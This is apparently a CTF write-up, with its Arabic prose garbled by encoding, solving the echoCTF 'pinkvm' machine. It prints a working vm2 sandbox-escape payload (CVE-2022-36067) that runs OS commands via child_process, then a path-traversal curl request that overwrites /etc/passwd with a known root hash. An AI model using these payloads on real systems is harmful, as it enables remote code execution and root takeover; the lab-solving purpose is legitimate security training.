---
layout: "post"
title: "echoCTF - pinkvm | Sandbox Bypass (CVE-2022-36067)"
date: 2023-03-9T21:44:02+01:00
---

> <html><body><b><p style="color:#ffffff;font-size:25px">Introduction:</p></b></body></html>

<div dir="rtl" align="right">
ุจุณู ุงููู ุงูุฑุญูู ุงูุฑุญูู
</div>

<div dir="rtl" align="right">
ุงูุณูุงู ุนูููู ูุฑุญูุฉ ุงููู ูุจุฑูุงุชุฉ, ุงูููู ุฑุงุญ ูุดุฑุญ ุญู ุชุญุฏู Pinkvm ุงูููุฏู ูู echoCTF ุทุจุนุงู ุงูุชุญุฏู ูุจูู ุนูู CVE ุญุฏูุซู ุงูุง ููู CVE-2022-36067 ุงูุงุตุงุจุฉ ูู ููุชุจุฉ vm2-sandbox ุชุฎุทู javascript sandbox  ูุงูุญุตูู ุนูู RCE ูุจุนุฏ ุฐูู ุณูู ูุดุฑุญ ุทุฑููุฉ ุชุตุนูุฏ ุงูุงูุชูุงุฒ ูุงูุญุตูู ุนูู ุตูุงุญูุงุช root.
</div>

<img src="/img/FirstBlood.png" alt="centered image" />

> <html><body><b><p style="color:#ffffff;font-size:25px">What is Sandbox:</p></b></body></html>

<div dir="rtl" align="right">
ูู ุจูุฆุฉ ุงูุชุฑุงุถูุฉ ูููู ูู ุฎูุงููุง ุจุชูููุฐ ุงูุชุนูููุงุช ุงูุจุฑูุฌูุฉ ุฎุงุฑุฌ ูุทุงู ุงูุฌูุงุฒ ูุชูููู ูู ุงููุฎุงุทุฑ, ุจูู ุงุฎุชุตุงุฑ ูู ุขููุฉ ุนุฒู ุฑุงุญ ุชุนุฒูู ูููุงุฌู ูู ุชูููุฐ ุชุนูููุงุชู ุงูุจุฑูุฌูุฉ ุงูุฎุจูุซู ุนูู ุฌูุงุฒ ุงููุถูู ูููุง ูู ููุถุญ ุงุนูุงู ููู ููุฏุฑ ูุชุฎุทู ูุฐุง  ุงูุดูุก ูููุฐ ุชุนูููุงุช javascript ุฎุจูุซุฉ ูุงูุญุตูู ุนูู Reverse Shell.
</div>

> <html><body><b><p style="color:#ffffff;font-size:25px">Enumeration with nmap:</p></b></body></html>

<div dir="rtl" align="right">
ุฑุงุญ ูุณุชุฎุฏู ุงุฏุงุฉ nmap ููุญุต ุงูููุงูุฐ ุงูููุชูุญุฉ ู ูุญุต ุงูุฎุฏูุงุช ุงููุณุชุฎุฏูุฉ ููุง ูู ููุถุญ ุงุฏูุงู
</div>



**`-sV`** ููุญุต ุงูุฎุฏูุงุช ุงููุณุชุฎุฏูุฉ **`-p-`** ูุงุณุชุฎุฑุงุฌ ุฌููุน ุงูููุงูุฐ ุงูููุชูุญุฉ

```bash
pegasus@RedEyes:~$ sudo nmap nmap -sV -p- $IP
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-10 18:50 +03
Failed to resolve "nmap".
Nmap scan report for $IP
Host is up (0.097s latency).

PORT     STATE SERVICE VERSION
3000/tcp open  http    Node.js Express framework

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 28.24 seconds
```
> <html><body><b><p style="color:#ffffff;font-size:25px">Port 3000 - HTTP:</p></b></body></html>

<div dir="rtl" align="right">
ุฑุงุญ ููุงุญุธ ุตูุฏูู ุฅุฏุฎุงู ูููู ูู ุฎูุงูู ุชูููุฐ ุงูููุฏ ุงูุฎุงุต ุจูุง ูุงุฏูุงู ูุจูู ูู ุทุฑููุฉ ุนูู ุงูููุฏ
</div>

<img src="/img/3000-http.png" alt="centered image" />

```javascript
module.exports = function() { YOUR_CODE_GOES_HERE }
```

<div dir="rtl" align="right">
ุจูู ุงุฎุชุตุงุฑ ุงูููุฏ ุงููุณุชุฎุฏู ูููู ุจุชุตุฏูุฑ ุงู ุดูุก ูุชู ุชุนุฑููุฉ ุฏุงุฎู function 
</div>

<div dir="rtl" align="right">
ุนูู ุณุจูู ุงููุซุงู ูู ุนุทููุงู ุนูููุฉ ุฑูุงุถูุฉ ุฑุงูุญ ูุชู ุชุตุฏูุฑูุง ูู ููุณ function ูุณูุชู ุชูููุฐูุง
</div>

<img src="/img/math.png" alt="centered image" />

<div dir="rtl" align="right">
ุจุนุฏ ุงูุจุญุซ ุนู ุงูููุชุจุฉ ุงููุณุชุฎุฏูุฉ ุงูุง ููู vm2 ุณูุฌุฏ ุงููุง ูุตุงุจุฉ Remote Code Execution
</div>


<div dir="rtl" align="right">
ุงูุจุงูููุฏ ุงููุณุชุฎุฏู
</div>

```javascript
globalThis.OldError=globalThis.Error;
try{
const a=123
a=44
}catch(err){
  console.log(err)  
}

globalThis.Error={}
globalThis.Error.prepareStackTrace=(errStr,traces)=>{
    traces[0].getThis().process.mainModule.require('child_process').execSync('ENETR OS COMMAND HERE') 
}  
const {stack}=new globalThis.OldError 
```

<div dir="rtl" align="right">
ุทุฑููุฉ ุนูู ุงูููุฏ ุจูู ุงุฎุชุตุงุฑ ุงุฐุง ุญุตู ุฎุทุฃ ูู ุชุนุฑูู ูุชุบูุฑ a ุฑุงุญ ูุชู ุชูููุฐ child_process ููุญุตู ุนูู Rerverse Shell
</div>

> <html><body><b><p style="color:#ffffff;font-size:25px">Reverse shell:</p></b></body></html>

<div dir="rtl" align="right">
ุจุนุฏ ุชูููุฐ ุงูุจุงูููุฏ ุงูุฎุงุต ุจูุง ุฑุงุญ ูุญุตู ุนูู Reverse shell.
</div>

<img src="/img/submit_payload.png" alt="centered image" />

<img src="/img/reverse_shell.png" alt="centered image" />

> <html><body><b><p style="color:#ffffff;font-size:25px">Privilege Escalation:</p></b></body></html>

<div dir="rtl" align="right">
ุฑุงุญ ูุณุชุฎุฏู ุงูุฑ ps -aux ูุนุฑุถ ุฌููุน ุงูุนูููุงุช ูุงููุธุงู
</div>

```bash
ETSCTF@pinkvm:/app$ ps -aux | grep root
root         1  0.0  0.0   2276   756 pts/0    Ss   08:30   0:00 /sbin/tini -- /entrypoint.sh supervisord -n
root         7  0.0  0.0   3732  2856 pts/0    S+   08:30   0:00 /bin/bash /entrypoint.sh supervisord -n
root        18  0.0  0.5  24328 20412 pts/0    S+   08:30   0:01 /usr/bin/python2 /usr/bin/supervisord -n
root        22  0.0  1.0 11103740 42796 pts/0  Sl   08:30   0:00 node /usr/local/bin/nako3edit
root     13280  0.0  0.0   3732  2748 ?        S    11:25   0:00 /bin/bash /usr/local/sbin/healthcheck.sh
root     13281  0.0  0.1  94884  7900 ?        S    11:25   0:00 curl -s -f http://localhost:3000/
```
<div dir="rtl" align="right">
ุฑุงุญ ููุงุญุธ ุงู ุงูุฑูุช ูุดุบู ุณูุฑุจุช nako3edit
ุจุนุฏ ุงุณุชุนุฑุงุถ ุงูุณูุฑุจุช ุฑุงุญ ููุงุญุธ ุงูู ูุดุบู ูููุฐ 8888 ููุนุทููุง ูููุฉ appkey ูู Location header  
</div>

```javascript
#!/usr/bin/env node
/** nako3edit
node
HTTP
) */
import path from 'path'
import fs, { existsSync } from 'fs'
import { execSync } from 'child_process'
import opener from 'opener'
import http from 'http'
// __dirname 
import url from 'url'
const __filename = url.fileURLToPath(import.meta.url)
const __dirname = path.dirname(__filename)
// CONST
const SERVER_PORT = 8888
const rootDir = path.resolve(__dirname)
const releaseDir = path.resolve(path.join(__dirname, '../../release'))
const isWin = process.platform === 'win32'
const homeDir = process.env[isWin ? 'USERPROFILE' : 'HOME']
const userDir = path.join(homeDir, 'nadesiko3_user')
const CNAKO3 = path.resolve(path.join(__dirname, '../../src/cnako3.mjs'))
const NODE = process.argv[0]
const appkey = 'K' + Math.floor(Math.random() * 10000000).toString(16) // <--- appkey
if (!fs.existsSync(userDir)) { fs.mkdirSync(userDir) }
const server = http.createServer(function (req, res) {
  console.log('[
]', JSON.stringify(req.url))
  // root 
 "demo/"
  if (req.url === '/') {
    res.writeHead(302, { 'Location': `/html/files.html?appkey=${appkey}` }) // <---  appkey as a query parameter
    res.end('<a href="/html/files.html">HTML</a>')
    return

```

```bash
ETSCTF@pinkvm:/app$ curl localhost:8888 -i
HTTP/1.1 302 Found
Location: /html/files.html?appkey=K8fc911 <--- appkey
Date: Fri, 10 Mar 2023 12:00:08 GMT
Connection: keep-alive
Keep-Alive: timeout=5
Transfer-Encoding: chunked
```


<div dir="rtl" align="right">
ุจุนุฏ ุญุตูููุง ุนูู appkey ูุญูู ุงูููุฏ ููุดูู ูุด ุงูุงุดูุงุก ุงูู ููุฏุฑ ูุณูููุง 
</div>


```javascript
function apiSave (res, params) {
  res.writeHead(200, { 'Content-Type': 'text/plain; charset=utf-8' })
  const appkeyUser = params.appkey
  if (appkey !== appkeyUser) {
    res.end('[ERROR] ใญใผใ้ใใพใ')
    return
  }
  const fname = params.file
  const body = params.body
  const fullpath = path.join(userDir, fname)
  try {
    fs.writeFileSync(fullpath, body, 'utf-8')
    console.log('[save] file=', fullpath)
    console.log('body=', body)
    console.log('--------------------------------')
    res.end('ok')
  } catch (err) {
    res.end('[ERROR] ไฟๅญใซๅคฑๆใใพใใ๐ญ')
  }
}

```

<div dir="rtl" align="right">
ุฌููู ููููุง function ูุณูุญ ููุง ุจุญูุธ ููู ุจูุญุชููุงุช ุฎุงุตู ุจูุง ููุชุทูุจ 3 ูุชุบูุฑุงุช ุงูุง ููู
</div>

- file
- body
- appkey

<div dir="rtl" align="right">
ุจุญูู ุงู ุงูุณูุฑุจุช ูุนูู ุจุตูุงุญูุงุช ุฑูุช ุฑุงุญ ุงุนุฏู ุนูู ููู passwd ูุงุญุท ุจุงุณูุฑุฏ ูุฑูุช
</div>

<div dir="rtl" align="right">
ุฑุงุญ ููุดุฆ ุจุงุณูุฑุฏ ุนู ุทุฑูู ุงูุงูุฑ ุงุฏูุงู
</div>

```bash
pegasus@RedEyes:~$ openssl passwd -6 -salt xyz test 
$6$xyz$rjarwc/BNZWcH6B31aAXWo1942.i7rCX5AT/oxALL5gCznYVGKh6nycQVZiHDVbnbu0BsQyPfBgqYveKcCgOE0
```

<div dir="rtl" align="right">
ูููู ุงูุงู ุจุงุฑุณุงู ุงูุทูุจ
</div>

```bash
ETSCTF@pinkvm:/app$ curl 'http://localhost:8888/save?file=../../etc/passwd&body=root:$6$xyz$rjarwc/BNZWcH6B31aAXWo1942.i7rCX5AT/oxALL5gCznYVGKh6nycQVZiHDVbnbu0BsQyPfBgqYveKcCgOE0:0:0:root:/root:/bin/bash&appkey=K8fc911'
```

<img src="/img/user_root.png" alt="centered image" />

<div dir="rtl" align="right">
ูุจูุฐุง ุญุตููุง ุนูู ุฑูุช
</div>

> <html><body><b><p style="color:#ffffff;font-size:25px">References:</p></b></body></html>

- https://www.oxeye.io/blog/vm2-sandbreak-vulnerability-cve-2022-36067
- https://github.com/Prathamrajgor/Exploit-For-CVE-2022-36067
- https://security.snyk.io/vuln/SNYK-JS-VM2-3018201
- https://unix.stackexchange.com/questions/81240/manually-generate-password-for-etc-shadow

> <html><body><b><p style="color:#ffffff;font-size:25px">Author:</p></b></body></html>

**Twitter** :

```
https://twitter.com/57h
```